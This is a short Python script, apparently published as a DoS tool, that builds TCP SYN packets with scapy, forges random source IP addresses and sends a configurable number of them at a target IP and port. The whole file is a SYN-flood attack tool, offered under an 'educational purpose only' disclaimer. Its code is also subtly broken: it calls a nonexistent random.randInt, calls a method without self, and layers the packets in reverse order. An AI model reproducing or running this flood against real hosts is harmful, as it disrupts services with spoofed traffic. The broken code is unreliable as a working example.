#!usr/bin/python3

# Author : Ahmad Dwiyan
# For educational purpose only :D 
# Don't Forget happy today (Jangan Lupa Bahagia)


import socket , random
from scapy.all import *
from argparse import ArgumentParser

class Pysyndos():
    def __init__(self):
        print("[*] PYSYN - DOS BY LUNATICTECH [*]")
        print("[*]   github.com/dwiyantech    [*]")
        parser = ArgumentParser()
        parser.add_argument("-i","--ip",required=True,help="Source IP You want to send",type=str)
        parser.add_argument("-p","--port",required=True,help="Port Destination",type=int)
        parser.add_argument("-c","--counter",required=False,default=3650,help="Total packet you want to send",type=int)      
        argument = parser.parse_args()
        print(argument)
        self.sendSynDos(argument.ip,argument.port,argument.counter)

    def getRandomIp(self):
        ip = ".".join(map(str,(random.randInt(0,255)for x in range(4))))
        return ip   

    def sendSynDos(self,dstIP,dstPort,counter):
        total = 0
        print("[*] Sending packet.... [*]")
        for x in range(0,counter):
            window = random.randInt()
            src_port = random.randInt(0,10000)
            sequence = random.randInt()

            ip_packet = IP()
            ip_packet.src = getRandomIp()
            ip_packet.dst = dstIP

            tcp_packet = TCP()
            tcp_packet.sport = src_port
            tcp_packet.dport = dstPort
            tcp_packet.flags = "S"
            tcp_packet.seq = sequence
            tcp_packet.window = window
            send(tcp_packet/ip_packet,verbose=0)
            total += 1
        print("\n[*] Total Packets Send "+str(total))



if __name__ == "__main__":
    Pysyndos()


